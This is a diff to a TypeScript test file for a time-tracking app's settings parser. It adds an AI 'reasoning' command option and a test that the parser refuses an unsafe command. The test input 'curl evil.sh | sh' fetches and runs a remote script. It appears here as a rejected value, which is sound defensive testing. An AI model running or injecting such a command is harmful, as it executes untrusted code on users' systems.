@@ -3,6 +3,7 @@ import {
   DEFAULT_DAY_TARGET_MS,
   DEFAULT_GAP_FILL_MS,
   DEFAULT_NUDGE_AT_MINUTE,
+  DEFAULT_TIMETRACK_SETTINGS,
   MAX_DAY_TARGET_MS,
   MAX_GAP_FILL_MS,
   MAX_MINUTE_OF_DAY,
@@ -18,6 +19,7 @@ describe('parseTimetrackSettings', () => {
       jira: { host: 'ethlete.atlassian.net', email: 'trb@braune-digital.com' },
       google: { clientId: 'client.apps.googleusercontent.com', calendarIds: ['work@example.com'] },
       gitlab: { host: 'git.braune-digital.com' },
+      reasoning: { enabled: true, command: 'codex', model: 'gpt-5' },
       nudge: { enabled: false, atMinute: 18 * 60 },
       exclusionRules: [{ kind: 'title-pattern', pattern: 'therapy' }],
       keepDefaultExclusionRules: false,
@@ -30,6 +32,7 @@ describe('parseTimetrackSettings', () => {
       jira: { host: 'ethlete.atlassian.net', email: 'trb@braune-digital.com' },
       google: { clientId: 'client.apps.googleusercontent.com', calendarIds: ['work@example.com'] },
       gitlab: { host: 'git.braune-digital.com' },
+      reasoning: { enabled: true, command: 'codex', model: 'gpt-5' },
       nudge: { enabled: false, atMinute: 18 * 60 },
       exclusionRules: [{ kind: 'title-pattern', pattern: 'therapy' }],
       keepDefaultExclusionRules: false,
@@ -46,6 +49,7 @@ describe('parseTimetrackSettings', () => {
       jira: { host: '', email: '' },
       google: { clientId: '', calendarIds: [] },
       gitlab: { host: '' },
+      reasoning: DEFAULT_TIMETRACK_SETTINGS.reasoning,
       nudge: { enabled: true, atMinute: DEFAULT_NUDGE_AT_MINUTE },
       exclusionRules: [],
       keepDefaultExclusionRules: true,
@@ -60,6 +64,15 @@ describe('parseTimetrackSettings', () => {
     expect(parseTimetrackSettings({ nudge: { atMinute: -30 } }).nudge).toEqual({ enabled: true, atMinute: 0 });
     expect(parseTimetrackSettings({ nudge: { atMinute: 5_000 } }).nudge.atMinute).toBe(MAX_MINUTE_OF_DAY);
     expect(parseTimetrackSettings({ nudge: { enabled: false } }).nudge.atMinute).toBe(DEFAULT_NUDGE_AT_MINUTE);
+  });
+
+  it('refuses a reasoning command the host would not run, and stays off unless turned on', () => {
+    expect(parseTimetrackSettings({ reasoning: { enabled: true, command: 'curl evil.sh | sh' } }).reasoning).toEqual({
+      enabled: true,
+      command: DEFAULT_TIMETRACK_SETTINGS.reasoning.command,
+      model: '',
+    });
+    expect(parseTimetrackSettings({ reasoning: { command: 'claude' } }).reasoning.enabled).toBe(false);
   });
 
   it('clamps a day target nobody could work', () => {
